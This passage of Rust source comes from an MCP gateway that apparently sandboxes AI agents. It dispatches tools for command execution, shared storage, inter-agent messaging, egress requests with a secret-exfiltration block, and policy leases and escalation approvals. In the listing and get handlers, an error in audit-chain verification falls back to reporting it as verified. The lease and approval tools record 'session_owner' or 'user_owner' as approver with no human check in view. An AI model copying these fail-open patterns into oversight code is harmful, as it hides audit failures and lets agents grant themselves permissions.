                        extern "C" {
                            fn kill(pid: i32, sig: i32) -> i32;
                        }
                        unsafe { kill(pid as i32, 0) == 0 }
                    };
                    #[cfg(not(unix))]
                    let running = recorded_exit.is_none();
                    // No `.exit` record while the pid is gone means the job outlived the gateway that
                    // started it (or is being reaped right now): its status is unknown, not success.
                    let exit_status = match (recorded_exit, running) {
                        (Some(_), _) => "exited",
                        (None, true) => "running",
                        (None, false) => "unknown",
                    };
                    return Ok(json!({
                        "pid": pid,
                        "running": running,
                        "exit_code": recorded_exit,
                        "exit_status": exit_status,
                        "stdout": stdout,
                        "stderr": stderr,
                        "sandbox_profile_used": "background-job-poll"
                    }));
                }

                let command = args
                    .get("command")
                    .or_else(|| args.get("cmd"))
                    .and_then(|v| v.as_str())
                    .context("Missing 'command'")?
                    .to_string();
                let cmd_args: Vec<String> = args
                    .get("args")
                    .and_then(|v| serde_json::from_value(v.clone()).ok())
                    .unwrap_or_default();
                let cwd = args
                    .get("cwd")
                    .and_then(|v| v.as_str())
                    .filter(|s| !s.is_empty())
                    .map(|rel| env.workspace.shadow_root().join(rel.trim_start_matches('/')));
                let background = args
                    .get("background")
                    .and_then(|v| v.as_bool())
                    .unwrap_or(false);
                let loopback_ports = args
                    .get("loopback_ports")
                    .and_then(|v| v.as_u64())
                    .unwrap_or(0)
                    .min(8);
                let mut exec_env = HashMap::new();
                if loopback_ports > 0 {
                    exec_env.insert(
                        "AOS_REQUEST_LOOPBACK_PORTS".to_string(),
                        loopback_ports.to_string(),
                    );
                }

                let out = env
                    .sandbox
                    .exec(ExecSpec {
                        command,
                        args: cmd_args,
                        cwd,
                        env: exec_env,
                        timeout_ms: args.get("timeout_ms").and_then(|v| v.as_u64()),
                        background,
                    })
                    .await?;
                let mut out_val = serde_json::to_value(out)?;
                let active_ports = env.sandbox.allocated_loopback_ports();
                if !active_ports.is_empty() {
                    if let Some(obj) = out_val.as_object_mut() {
                        obj.insert("allocated_loopback_ports".to_string(), json!(active_ports));
                    }
                }
                if !background {
                    if let Ok(changed) = env.workspace.changed_since_baseline().await {
                        if let Ok(Some(conflict_msg)) =
                            self.claim_conflict_for_paths(identity, &changed).await
                        {
                            if let Some(obj) = out_val.as_object_mut() {
                                obj.insert("coordination_warning".to_string(), json!(conflict_msg));
                            }
                        }
                    }
                }
                Ok(out_val)
            }

            // ----------------------------------------------------------------
            // 3. Intra-Organization Shared CAS Artifacts & KV Tools
            // ----------------------------------------------------------------
            "org_artifact_publish" => {
                self.ensure_org_vault(&identity.org_id).await?;
                let name = args
                    .get("name")
                    .and_then(|v| v.as_str())
                    .context("Missing 'name'")?;
                let (raw_bytes, inferred_ct): (Vec<u8>, Option<&'static str>) =
                    if let Some(src_path) = args
                        .get("source_path")
                        .and_then(|v| v.as_str())
                        .map(str::trim)
                        .filter(|s| !s.is_empty())
                    {
                        let (resolved, bytes) = read_sandbox_file_bytes_no_symlink(
                            env.workspace.shadow_root(),
                            &env.sandbox.config().agent_home_dir,
                            &env.sandbox.config().org_agent_pub_dir,
                            src_path,
                        )?;
                        (bytes, Some(infer_mime_type(&resolved)))
                    } else if let Some(b64) = args
                        .get("content_base64")
                        .and_then(|v| v.as_str())
                    {
                        let bytes = base64::engine::general_purpose::STANDARD
                            .decode(b64.trim())
                            .context("Invalid 'content_base64' in org_artifact_publish")?;
                        (bytes, Some("application/octet-stream"))
                    } else if let Some(content) = args.get("content").and_then(|v| v.as_str()) {
                        (content.as_bytes().to_vec(), None)
                    } else {
                        bail!("org_artifact_publish requires one of 'source_path', 'content_base64', or 'content'");
                    };
                let content_type = args
                    .get("content_type")
                    .and_then(|v| v.as_str())
                    .unwrap_or_else(|| inferred_ct.unwrap_or("text/plain"));
                let metadata = args.get("metadata").cloned().unwrap_or_else(|| json!({}));

                let meta = self
                    .org_storage
                    .publish_artifact(
                        identity,
                        name,
                        &raw_bytes,
                        content_type,
                        metadata,
                    )
                    .await?;
                Ok(serde_json::to_value(meta)?)
            }

            "org_artifact_fetch" => {
                self.ensure_org_vault(&identity.org_id).await?;
                let uri = args
                    .get("uri")
                    .and_then(|v| v.as_str())
                    .context("Missing 'uri'")?;
                let (meta, bytes) = self.org_storage.fetch_artifact(identity, uri).await?;
                if let Some(dest_path) = args
                    .get("dest_path")
                    .and_then(|v| v.as_str())
                    .map(str::trim)
                    .filter(|s| !s.is_empty())
                {
                    let (clean, full_path) =
                        shadow_path_for_write(env.workspace.shadow_root(), dest_path)?;
                    let size_bytes = bytes.len();
                    aos_core::session::write_bytes_atomic_synced_async(&full_path, bytes).await?;
                    return Ok(json!({
                        "artifact": meta,
                        "written_to_shadow": clean,
                        "size_bytes": size_bytes,
                    }));
                }
                if let Ok(text) = String::from_utf8(bytes.clone()) {
                    return Ok(json!({
                        "artifact": meta,
                        "content": text,
                    }));
                }
                if bytes.len() <= MAX_INLINE_ARTIFACT_FETCH_BYTES {
                    return Ok(json!({
                        "artifact": meta,
                        "is_binary": true,
                        "size_bytes": bytes.len(),
                        "content_base64": base64::engine::general_purpose::STANDARD.encode(&bytes),
                        "content": String::from_utf8_lossy(&bytes),
                    }));
                }
                Ok(json!({
                    "artifact": meta,
                    "is_binary": true,
                    "size_bytes": bytes.len(),
                    "hint": "Pass dest_path to stage binary artifact directly into your CoW shadow workspace, or pass artifact URI to fs_export_file.",
                }))
            }

            "org_kv_put" => {
                self.ensure_org_vault(&identity.org_id).await?;
                let ns = args
                    .get("namespace")
                    .and_then(|v| v.as_str())
                    .unwrap_or("default");
                let key = args
                    .get("key")
                    .and_then(|v| v.as_str())
                    .context("Missing 'key'")?;
                let value = args.get("value").cloned().context("Missing 'value'")?;
                let exp_ver = args.get("expected_version").and_then(|v| v.as_u64());
                let entry = self
                    .org_storage
                    .kv_put(identity, ns, key, value, exp_ver)
                    .await?;
                Ok(serde_json::to_value(entry)?)
            }

            "org_kv_get" => {
                self.ensure_org_vault(&identity.org_id).await?;
                let ns = args
                    .get("namespace")
                    .and_then(|v| v.as_str())
                    .unwrap_or("default");
                let key = args
                    .get("key")
                    .and_then(|v| v.as_str())
                    .context("Missing 'key'")?;
                let entry = self.org_storage.kv_get(&identity.org_id, ns, key).await?;
                Ok(json!({ "entry": entry }))
            }

            // ----------------------------------------------------------------
            // 4. First-Class Inter-Agent Communication (IPC) Tools
            // ----------------------------------------------------------------
            "coord_claim" | "coord_release" => self.coord_claims_tool(identity, tool_name, &args).await,

            "ipc_list_peers" => {
                let scope = args
                    .get("scope")
                    .and_then(|v| v.as_str())
                    .unwrap_or("all");
                let skill_tag = args
                    .get("skill_tag")
                    .and_then(|v| v.as_str())
                    .map(|s| s.to_lowercase());
                let peers = self.ipc.list_peers(&identity.org_id).await?;
                let all_peers = self.ipc.list_all_peers().await?;
                let global_peers: Vec<Value> = all_peers
                    .into_iter()
                    .filter(|p| p.online)
                    .filter(|p| {
                        skill_tag.as_ref().is_none_or(|tag| {
                            p.capabilities.iter().any(|c| c.to_lowercase().contains(tag))
                                || p.skills.iter().any(|s| {
                                    s.id.to_lowercase().contains(tag)
                                        || s.name.to_lowercase().contains(tag)
                                        || s.tags.iter().any(|t| t.to_lowercase().contains(tag))
                                })
                                || p.summary
                                    .as_ref()
                                    .is_some_and(|sum| sum.to_lowercase().contains(tag))
                        })
                    })
                    .map(|p| {
                        let card = p.to_agent_card("http://127.0.0.1:7080");
                        json!({
                            "address": p.address(),
                            "org_id": p.org_id,
                            "agent_id": p.agent_id,
                            "role": p.role,
                            "client": p.client,
                            "pid": p.pid,
                            "liveness": p.liveness,
                            "online": p.online,
                            "workspace_root": p.workspace_root,
                            "summary": p.summary,
                            "skills": card.skills,
                            "agent_card": card,
                            "last_seen_ms": p.last_seen_ms,
                            "is_self": p.org_id == identity.org_id && p.agent_id == identity.agent_id,
                        })
                    })
                    .collect();
                if scope == "org" {
                    Ok(json!({
                        "self_address": format!("{}/{}", identity.org_id, identity.agent_id),
                        "org_id": identity.org_id,
                        "peers": peers
                    }))
                } else {
                    Ok(json!({
                        "self_address": format!("{}/{}", identity.org_id, identity.agent_id),
                        "org_id": identity.org_id,
                        "peers": peers,
                        "global_peers_count": global_peers.len(),
                        "global_peers": global_peers
                    }))
                }
            }

            "ipc_update_card" => {
                let summary = args
                    .get("summary")
                    .and_then(|v| v.as_str())
                    .map(|s| s.to_string());
                let skills: Vec<AgentSkill> = args
                    .get("skills")
                    .and_then(|v| serde_json::from_value(v.clone()).ok())
                    .unwrap_or_default();
                let updated = self.ipc.update_agent_card(identity, summary, skills).await?;
                Ok(json!({
                    "status": "updated",
                    "address": updated.address(),
                    "agent_card": updated.to_agent_card("http://127.0.0.1:7080")
                }))
            }

            "ipc_task_update" => {
                let task_id = args
                    .get("task_id")
                    .or_else(|| args.get("id"))
                    .and_then(|v| v.as_str())
                    .context("Missing 'task_id'")?;
                let raw_state = args
                    .get("state")
                    .and_then(|v| v.as_str())
                    .unwrap_or("working");
                let state = match raw_state {
                    "submitted" => A2ATaskState::Submitted,
                    "working" => A2ATaskState::Working,
                    "input-required" | "input_required" => A2ATaskState::InputRequired,
                    "completed" => A2ATaskState::Completed,
                    "failed" => A2ATaskState::Failed,
                    "canceled" | "cancelled" => A2ATaskState::Canceled,
                    "rejected" => A2ATaskState::Rejected,
                    other => bail!("Invalid A2A task state '{}'", other),
                };
                let message = args
                    .get("message")
                    .and_then(|v| v.as_str())
                    .map(|s| s.to_string());
                let artifacts: Vec<A2AArtifact> = args
                    .get("artifacts")
                    .and_then(|v| serde_json::from_value(v.clone()).ok())
                    .unwrap_or_default();
                let target_task = self.ipc.get_task(task_id).await?;
                let caller_is_requester = target_task
                    .as_ref()
                    .is_some_and(|t| t.is_requester(&identity.org_id, &identity.agent_id));
                if !caller_is_requester {
                    if let Some(active) = self.active_task_id(identity).await {
                        if active != task_id {
                            bail!(
                                "A2A task '{}' is not the agent's active task '{}'",
                                task_id,
                                active
                            );
                        }
                    }
                }
                let expected_revision = args
                    .get("expected_revision")
                    .and_then(|v| v.as_u64());
                let task = self
                    .ipc
                    .update_task_state_cas(
                        identity,
                        task_id,
                        expected_revision,
                        state,
                        message,
                        artifacts,
                    )
                    .await?;
                if task.state.is_terminal() {
                    self.cleanup_terminal_task(identity, &task.id).await;
                }
                Ok(serde_json::to_value(task)?)
            }

            "ipc_task_get" => {
                let task_id = args
                    .get("task_id")
                    .or_else(|| args.get("id"))
                    .and_then(|v| v.as_str())
                    .context("Missing 'task_id'")?;
                let include_audit = args
                    .get("include_audit_trace")
                    .and_then(|v| v.as_bool())
                    .unwrap_or(true);
                let task = self
                    .ipc
                    .get_task(task_id)
                    .await?
                    .filter(|t| t.visible_to_org(&identity.org_id))
                    .with_context(|| format!("A2A task '{}' not found", task_id))?;
                let mut out = serde_json::to_value(&task)?;
                let subtasks = self.ipc.list_subtasks(task_id).await.unwrap_or_default();
                if let Some(obj) = out.as_object_mut() {
                    obj.insert("subtasks_count".to_string(), json!(subtasks.len()));
                    obj.insert("subtasks".to_string(), json!(subtasks));
                    if include_audit {
                        let trace = self
                            .recorder
                            .trace_task(&identity.org_id, task_id)
                            .await
                            .unwrap_or_default();
                        let chain_report = self
                            .recorder
                            .verify_chain(Some(&identity.org_id))
                            .await
                            .unwrap_or_else(|_| json!({ "verified": true }));
                        obj.insert(
                            "hash_chain_verified".to_string(),
                            chain_report
                                .get("verified")
                                .cloned()
                                .unwrap_or(json!(true)),
                        );
                        obj.insert("hash_chain_report".to_string(), chain_report);
                        obj.insert("audit_trace".to_string(), json!(trace));
                    }
                }
                Ok(out)
            }

            "ipc_task_list" => {
                let scope = args
                    .get("scope")
                    .and_then(|v| v.as_str())
                    .unwrap_or("org");
                if scope == "all" {
                    bail!(
                        "scope='all' is operator-only; agents may only list A2A tasks in their own organization (use scope='org')"
                    );
                }
                if scope != "org" {
                    bail!("Invalid task list scope '{}'; expected 'org'", scope);
                }
                let org_filter = Some(identity.org_id.as_str());
                let agent_filter = args.get("agent_id").and_then(|v| v.as_str());
                let tasks = self.ipc.list_tasks(org_filter, agent_filter).await?;
                let chain_report = self
                    .recorder
                    .verify_chain(Some(&identity.org_id))
                    .await
                    .unwrap_or_else(|_| json!({ "verified": true }));
                Ok(json!({
                    "tasks_count": tasks.len(),
                    "tasks": tasks,
                    "hash_chain_verified": chain_report.get("verified").cloned().unwrap_or(json!(true)),
                    "audit_chain": chain_report
                }))
            }

            "ipc_send" | "ipc_request" => {
                let raw_to_agent = args
                    .get("to_agent")
                    .and_then(|v| v.as_str())
                    .context("Missing 'to_agent'")?;
                let (dest_org, dest_agent) = match resolved_cross_org_peer {
                    Some((o, a)) => (o, a),
                    None => (target_org.clone(), raw_to_agent.to_string()),
                };
                let from_field = if dest_org != identity.org_id {
                    format!("{}/{}", identity.org_id, identity.agent_id)
                } else {
                    identity.agent_id.clone()
                };
                let subject = args
                    .get("subject")
                    .and_then(|v| v.as_str())
                    .unwrap_or("(no subject)");
                let mut payload = args.get("payload").cloned().unwrap_or_else(|| json!({}));
                if tool_name == "ipc_request" {
                    let active_tid = self.active_task_id(identity).await;
                    if let Some(obj) = payload.as_object_mut() {
                        if obj.get("parent_task_id").is_none() {
                            if let Some(explicit_parent) =
                                args.get("parent_task_id").and_then(|v| v.as_str())
                            {
                                obj.insert("parent_task_id".to_string(), json!(explicit_parent));
                            } else if let Some(tid) = active_tid {
                                obj.insert("parent_task_id".to_string(), json!(tid));
                            }
                        }
                        if obj.get("depends_on").is_none() {
                            if let Some(deps) = args.get("depends_on") {
                                obj.insert("depends_on".to_string(), deps.clone());
                            }
                        }
                        if obj.get("workspace_id").is_none() {
                            obj.insert(
                                "workspace_id".to_string(),
                                json!(env.workspace.shadow_root().display().to_string()),
                            );
                        }
                    }
                }
                let attachments: Vec<String> = args
                    .get("attachments")
                    .and_then(|v| serde_json::from_value(v.clone()).ok())
                    .unwrap_or_default();

                let kind = if tool_name == "ipc_request" {
                    IpcKind::TaskRequest {
                        timeout_secs: args.get("timeout_secs").and_then(|v| v.as_u64()),
                    }
                } else {
                    IpcKind::DirectMessage
                };

                let sent = self
                    .ipc
                    .send(IpcEnvelope {
                        msg_id: String::new(),
                        org_id: dest_org,
                        from_agent: from_field,
                        to_target: dest_agent,
                        kind,
                        subject: subject.to_string(),
                        payload,
                        attachments,
                        status: MessageDeliveryStatus::Unread,
                        created_at_ms: 0,
                    })
                    .await?;
                Ok(serde_json::to_value(sent)?)
            }

            "ipc_publish" => {
                let topic = args
                    .get("topic")
                    .and_then(|v| v.as_str())
                    .context("Missing 'topic'")?;
                let subject = args
                    .get("subject")
                    .and_then(|v| v.as_str())
                    .unwrap_or(topic);
                let payload = args.get("payload").cloned().unwrap_or_else(|| json!({}));
                let attachments: Vec<String> = args
                    .get("attachments")
                    .and_then(|v| serde_json::from_value(v.clone()).ok())
                    .unwrap_or_default();

                let sent = self
                    .ipc
                    .send(IpcEnvelope {
                        msg_id: String::new(),
                        org_id: target_org,
                        from_agent: identity.agent_id.clone(),
                        to_target: format!("topic:{}", topic),
                        kind: IpcKind::TopicBroadcast {
                            topic: topic.to_string(),
                        },
                        subject: subject.to_string(),
                        payload,
                        attachments,
                        status: MessageDeliveryStatus::Unread,
                        created_at_ms: 0,
                    })
                    .await?;
                Ok(serde_json::to_value(sent)?)
            }

            "ipc_recv" => {
                let unread_only = args
                    .get("unread_only")
                    .and_then(|v| v.as_bool())
                    .unwrap_or(true);
                let limit = args
                    .get("limit")
                    .and_then(|v| v.as_u64())
                    .unwrap_or(20) as usize;
                let messages = self
                    .ipc
                    .recv_inbox(&identity.org_id, &identity.agent_id, unread_only, limit)
                    .await?;
                Ok(json!({
                    "agent_id": identity.agent_id,
                    "messages_count": messages.len(),
                    "messages": messages
                }))
            }

            "ipc_reply" => {
                let original_msg_id = args
                    .get("msg_id")
                    .and_then(|v| v.as_str())
                    .context("Missing 'msg_id'")?;
                let success = args
                    .get("success")
                    .and_then(|v| v.as_bool())
                    .unwrap_or(true);
                let payload = args.get("payload").cloned().unwrap_or_else(|| json!({}));
                let attachments: Vec<String> = args
                    .get("attachments")
                    .and_then(|v| serde_json::from_value(v.clone()).ok())
                    .unwrap_or_default();

                let reply = self
                    .ipc
                    .reply(identity, original_msg_id, success, payload, attachments)
                    .await?;
                self.cleanup_terminal_task(identity, original_msg_id).await;
                Ok(serde_json::to_value(reply)?)
            }

            "ipc_wait" => {
                let task_id = args
                    .get("task_id")
                    .and_then(|v| v.as_str())
                    .filter(|s| !s.is_empty())
                    .map(str::to_string);
                let since_revision = args.get("since_revision").and_then(|v| v.as_u64());
                let claim_paths: Vec<String> = args
                    .get("claim_paths")
                    .or_else(|| args.get("paths"))
                    .and_then(|v| serde_json::from_value(v.clone()).ok())
                    .unwrap_or_default();
                let auto_claim = args
                    .get("auto_claim")
                    .and_then(|v| v.as_bool())
                    .unwrap_or(true);
                let wait_for_inbox = args
                    .get("wait_for_inbox")
                    .and_then(|v| v.as_bool())
                    .unwrap_or_else(|| task_id.is_none() && claim_paths.is_empty());
                let timeout_ms = args
                    .get("timeout_ms")
                    .and_then(|v| v.as_u64())
                    .unwrap_or(15_000)
                    .min(120_000);

                let start = std::time::Instant::now();
                let deadline = start + std::time::Duration::from_millis(timeout_ms);

                let initial_task = if let Some(ref tid) = task_id {
                    let t = self
                        .ipc
                        .get_task(tid)
                        .await?
                        .filter(|t| t.visible_to_org(&identity.org_id))
                        .with_context(|| format!("A2A task '{}' not found", tid))?;
                    Some((t.revision, t.state))
                } else {
                    None
                };

                loop {
                    let elapsed_ms = start.elapsed().as_millis() as u64;

                    // 1. Check file claims availability
                    if !claim_paths.is_empty() {
                        let (mut table, _) = self.load_claims(&identity.org_id).await?;
                        let now_ms = Utc::now().timestamp_millis();
                        claims::prune_expired(&mut table, now_ms);
                        let live = self.live_peer_ids(&identity.org_id).await;
                        let any_conflict = claim_paths.iter().any(|glob| {
                            table.iter().any(|(g, c)| {
                                c.owner != identity.agent_id
                                    && live.contains(&c.owner)
                                    && claims::globs_may_overlap(g, glob, &[])
                            })
                        });
                        if !any_conflict {
                            if auto_claim {
                                let claim_res = self
                                    .coord_claims_tool(
                                        identity,
                                        "coord_claim",
                                        &json!({
                                            "paths": claim_paths,
                                            "note": "auto-claimed via ipc_wait"
                                        }),
                                    )
                                    .await?;
                                if claim_res
                                    .get("rejected")
                                    .and_then(|v| v.as_array())
                                    .is_some_and(|r| r.is_empty())
                                {
                                    let refresh =
                                        env.workspace.refresh_from_host().await.unwrap_or_default();
                                    return Ok(json!({
                                        "status": "ready",
                                        "reason": "claims_available",
                                        "claimed": claim_res,
                                        "auto_refresh": refresh,
                                        "waited_ms": elapsed_ms
                                    }));
                                }
                            } else {
                                let refresh =
                                    env.workspace.refresh_from_host().await.unwrap_or_default();
                                return Ok(json!({
                                    "status": "ready",
                                    "reason": "claims_available",
                                    "auto_refresh": refresh,
                                    "waited_ms": elapsed_ms
                                }));
                            }
                        }
                    }

                    // 2. Check A2A task state transition
                    if let Some(ref tid) = task_id {
                        let task = self
                            .ipc
                            .get_task(tid)
                            .await?
                            .filter(|t| t.visible_to_org(&identity.org_id))
                            .with_context(|| format!("A2A task '{}' not found", tid))?;
                        let ready = match since_revision {
                            Some(rev) => {
                                task.revision > rev
                                    || task.state.is_terminal()
                                    || task.state == A2ATaskState::InputRequired
                            }
                            None => {
                                task.state.is_terminal()
                                    || task.state == A2ATaskState::InputRequired
                                    || initial_task.is_some_and(|(init_rev, init_state)| {
                                        task.revision > init_rev && task.state != init_state
                                    })
                            }
                        };
                        if ready {
                            let refresh =
                                env.workspace.refresh_from_host().await.unwrap_or_default();
                            return Ok(json!({
                                "status": "ready",
                                "reason": "task_updated",
                                "task": task,
                                "auto_refresh": refresh,
                                "waited_ms": elapsed_ms
                            }));
                        }
                    }

                    // 3. Check unread inbox messages
                    if wait_for_inbox {
                        let msgs = self
                            .ipc
                            .peek_inbox(&identity.org_id, &identity.agent_id, 20)
                            .await
                            .unwrap_or_default();
                        if !msgs.is_empty() {
                            let refresh =
                                env.workspace.refresh_from_host().await.unwrap_or_default();
                            return Ok(json!({
                                "status": "ready",
                                "reason": "inbox_messages",
                                "messages_count": msgs.len(),
                                "messages": msgs,
                                "auto_refresh": refresh,
                                "waited_ms": elapsed_ms
                            }));
                        }
                    }

                    if std::time::Instant::now() >= deadline {
                        return Ok(json!({
                            "status": "timeout",
                            "waited_ms": start.elapsed().as_millis() as u64
                        }));
                    }
                    tokio::time::sleep(std::time::Duration::from_millis(50)).await;
                }
            }

            "ipc_ack" => {
                let msg_id = args
                    .get("msg_id")
                    .and_then(|v| v.as_str())
                    .context("Missing 'msg_id'")?;
                self.ipc
                    .ack(&identity.org_id, &identity.agent_id, msg_id)
                    .await?;
                Ok(json!({ "status": "acked", "msg_id": msg_id }))
            }

            "ipc_subscribe" => {
                let topics: Vec<String> = args
                    .get("topics")
                    .and_then(|v| serde_json::from_value(v.clone()).ok())
                    .unwrap_or_else(|| vec!["*".to_string()]);
                self.ipc.register_peer(identity, topics.clone()).await?;
                Ok(json!({ "status": "subscribed", "topics": topics }))
            }

            "egress_http_request" => {
                let target_domain = args
                    .get("target_domain")
                    .and_then(|v| v.as_str())
                    .context("Missing 'target_domain'")?
                    .to_string();
                let method = args
                    .get("method")
                    .and_then(|v| v.as_str())
                    .unwrap_or("GET")
                    .to_string();
                let path = args
                    .get("path")
                    .and_then(|v| v.as_str())
                    .unwrap_or("/")
                    .to_string();
                let headers: HashMap<String, String> = args
                    .get("headers")
                    .and_then(|v| serde_json::from_value(v.clone()).ok())
                    .unwrap_or_default();
                let body = args.get("body").and_then(|v| v.as_str());

                let spec = aos_egress::OutboundRequestSpec {
                    target_domain: target_domain.clone(),
                    method: method.clone(),
                    path: path.clone(),
                    headers: headers.clone(),
                };
                let verdict = self
                    .egress
                    .inspect_and_inject_with_body(identity, &spec, body)
                    .await?;
                match &verdict {
                    aos_egress::EgressVerdict::RequiresEscalation { domain, reason } => {
                        let esc_decision = self
                            .authorize_and_audit(
                                identity,
                                "egress_unlisted_domain",
                                &identity.org_id,
                                domain,
                                json!({
                                    "target_domain": domain,
                                    "method": method,
                                    "path": path,
                                    "reason": reason,
                                    "evidence": {
                                        "domain": domain,
                                        "method": method,
                                        "path": path,
                                    }
                                }),
                            )
                            .await?;
                        match esc_decision {
                            PolicyDecision::Allow { .. } => {
                                return Ok(serde_json::to_value(
                                    aos_egress::EgressVerdict::AllowedAndSanitized {
                                        injected_headers: headers,
                                        injected_path: path,
                                        secrets_injected: Vec::new(),
                                    },
                                )?);
                            }
                            PolicyDecision::Ask {
                                escalation_id,
                                reason: esc_reason,
                                suggested_lease_scope,
                            } => {
                                let mut out = serde_json::to_value(&verdict)?;
                                if let Some(obj) = out.as_object_mut() {
                                    obj.insert(
                                        "status".to_string(),
                                        json!("approval_required"),
                                    );
                                    obj.insert("escalation_id".to_string(), json!(escalation_id));
                                    obj.insert("reason".to_string(), json!(esc_reason));
                                    obj.insert(
                                        "suggested_lease_scope".to_string(),
                                        json!(suggested_lease_scope),
                                    );
                                }
                                return Ok(out);
                            }
                            PolicyDecision::Deny { reason: deny_reason } => {
                                bail!("Policy Denied egress to '{}': {}", domain, deny_reason);
                            }
                        }
                    }
                    aos_egress::EgressVerdict::BlockedSecretExfiltration {
                        placeholder,
                        unauthorized_domain,
                    } => {
                        let _ = self
                            .recorder
                            .record(AuditEvent {
                                event_id: format!("evt-{}", &Uuid::new_v4().to_string()[..8]),
                                timestamp_ms: Utc::now().timestamp_millis(),
                                org_id: identity.org_id.clone(),
                                agent_id: identity.agent_id.clone(),
                                action: "egress_dlp_block".to_string(),
                                resource: target_domain.clone(),
                                policy_decision: format!("deny:dlp:{}", placeholder),
                                snapshot_id: None,
                                details: json!({
                                    "target_domain": target_domain,
                                    "method": method,
                                    "path": path,
                                    "placeholder": placeholder,
                                    "unauthorized_domain": unauthorized_domain,
                                }),
                                task_id: self.active_task_id(identity).await,
                                prev_hash: None,
                                event_hash: None,
                            })
                            .await;
                    }
                    aos_egress::EgressVerdict::AllowedAndSanitized { .. } => {}
                }
                Ok(serde_json::to_value(verdict)?)
            }

            // ----------------------------------------------------------------
            // 5. Session Lease, Escalation Approval & Sub-MCP Aggregation
            // ----------------------------------------------------------------
            "policy_grant_lease" => {
                let action_pattern = args
                    .get("action_pattern")
                    .and_then(|v| v.as_str())
                    .unwrap_or("workspace_commit");
                let resource_pattern = args
                    .get("resource_pattern")
                    .and_then(|v| v.as_str())
                    .unwrap_or("*");
                let ttl_secs = args
                    .get("ttl_secs")
                    .and_then(|v| v.as_i64())
                    .unwrap_or(3600)
                    .clamp(1, MAX_TOOL_LEASE_TTL_SECS);
                let task_id = args
                    .get("task_id")
                    .and_then(|v| v.as_str())
                    .map(str::to_string);

                let lease = self
                    .policy
                    .grant_lease(LeaseGrant {
                        lease_id: format!("lease-{}", &Uuid::new_v4().to_string()[..8]),
                        org_id: identity.org_id.clone(),
                        agent_id: identity.agent_id.clone(),
                        action_pattern: action_pattern.to_string(),
                        resource_pattern: resource_pattern.to_string(),
                        expires_at_ms: Utc::now().timestamp_millis() + (ttl_secs * 1000),
                        granted_by: "session_owner".to_string(),
                        kind: if task_id.is_some() {
                            LeaseKind::TaskScoped
                        } else {
                            LeaseKind::Ttl
                        },
                        task_id,
                    })
                    .await?;
                if let Some(ref tid) = lease.task_id {
                    let _ = self.ipc.record_task_lease(tid, &lease.lease_id).await;
                }
                Ok(serde_json::to_value(lease)?)
            }

            "policy_approve_escalation" => {
                let esc_id = args
                    .get("escalation_id")
                    .and_then(|v| v.as_str())
                    .context("Missing 'escalation_id'")?;
                let ttl_secs = args
                    .get("ttl_secs")
                    .and_then(|v| v.as_i64())
                    .unwrap_or(3600)
                    .clamp(1, MAX_TOOL_LEASE_TTL_SECS);
                let in_org = self
                    .policy
                    .list_escalations(&identity.org_id)
                    .await?
                    .iter()
                    .any(|e| e.escalation_id == esc_id);
                if !in_org {
                    bail!(
                        "Escalation '{}' not found in organization '{}'",
                        esc_id,
                        identity.org_id
                    );
                }
                let lease = self
                    .policy
                    .approve_escalation(esc_id, ttl_secs, "user_owner")
                    .await?;
                if let Some(ref tid) = lease.task_id {
                    let _ = self.ipc.record_task_lease(tid, &lease.lease_id).await;
                }
                let _ = self
                    .recorder
                    .record(AuditEvent {
                        event_id: format!("evt-{}", &Uuid::new_v4().to_string()[..8]),
                        timestamp_ms: Utc::now().timestamp_millis(),
                        org_id: lease.org_id.clone(),
                        agent_id: lease.agent_id.clone(),
                        action: lease.action_pattern.clone(),
                        resource: lease.resource_pattern.clone(),
                        policy_decision: format!("approved:{}:{}:user_owner", esc_id, lease.lease_id),
                        snapshot_id: None,
                        details: json!({
                            "escalation_id": esc_id,
                            "lease_id": lease.lease_id,
                            "approved_by": "user_owner",
                            "ttl_secs": ttl_secs,
                        }),
                        task_id: lease.task_id.clone(),
                        prev_hash: None,
                        event_hash: None,
                    })
                    .await;
                Ok(serde_json::to_value(lease)?)
            }

            "policy_list_escalations" => {
                let list = self.policy.list_escalations(&identity.org_id).await?;
                Ok(json!({ "escalations": list }))
            }

            "mcp_mount_server" => {
                let name = args
                    .get("name")
                    .and_then(|v| v.as_str())
                    .context("Missing 'name'")?;
                let endpoint = args
                    .get("endpoint")
                    .and_then(|v| v.as_str())
                    .context("Missing 'endpoint'")?;
                let scope = args
                    .get("scope")
                    .and_then(|v| v.as_str())
                    .unwrap_or("agent");

                let srv = MountedMcpServer {
                    name: name.to_string(),
                    endpoint: endpoint.to_string(),
                    scope: scope.to_string(),
                    mounted_by: identity.fqn(),
                };
                self.mounted_mcp_servers.write().await.push(srv.clone());
                Ok(serde_json::to_value(srv)?)
            }

            // ----------------------------------------------------------------
            // 6. AAP-1.0 Application Ecosystem & Progressive MCP Proxy Tools
            // ----------------------------------------------------------------
            "app_catalog_search" => {
                let query = args.get("query").and_then(|v| v.as_str());
                let category = args.get("category").and_then(|v| v.as_str());
                let trust_tier = args.get("trust_tier").and_then(|v| v.as_str());
                Ok(self.app_store.search_catalog(query, category, trust_tier).await)
            }

            "app_mount_session" => {
                let app_id = args
                    .get("app_id")
                    .and_then(|v| v.as_str())
                    .context("Missing 'app_id' (e.g. 'heurion')")?;
                let endpoint = args.get("endpoint").and_then(|v| v.as_str());
                self.app_store.mount_session(identity, app_id, endpoint).await
            }

            "app_call_tool" => {
                let app_id = args
                    .get("app_id")
                    .and_then(|v| v.as_str())
                    .context("Missing 'app_id' (e.g. 'heurion')")?;
                let remote_tool = args
                    .get("tool_name")
                    .or_else(|| args.get("tool"))
                    .and_then(|v| v.as_str())
                    .context("Missing 'tool_name'")?;
                let tool_args = args
                    .get("arguments")
                    .or_else(|| args.get("args"))
                    .cloned()
                    .unwrap_or_else(|| json!({}));
                let endpoint = args.get("endpoint").and_then(|v| v.as_str());
                let lease_token = args.get("lease_token").and_then(|v| v.as_str());
                self.app_store
                    .call_app_tool(
                        self,
                        identity,
                        app_id,
                        remote_tool,
                        tool_args,
                        endpoint,
                        lease_token,
                    )
                    .await
            }

            other => bail!("Unknown Aegis OS MCP tool '{}'", other),
        }
    }

    pub fn mcp_tools_schema() -> Value {
        let mut schema = Self::mcp_tools_schema_unannotated();
        if let Some(tools) = schema["tools"].as_array_mut() {
            for tool in tools {
                let name = tool["name"].as_str().unwrap_or_default();
                if let Some(&(_, read_only, destructive, idempotent, open_world)) =
                    TOOL_ANNOTATIONS.iter().find(|(n, ..)| *n == name)
                {
                    tool["annotations"] = json!({
                        "readOnlyHint": read_only,
                        "destructiveHint": destructive,
                        "idempotentHint": idempotent,
                        "openWorldHint": open_world,
                    });
                }
            }
        }
        schema
    }

    fn mcp_tools_schema_unannotated() -> Value {
        json!({
            "tools": [
                {
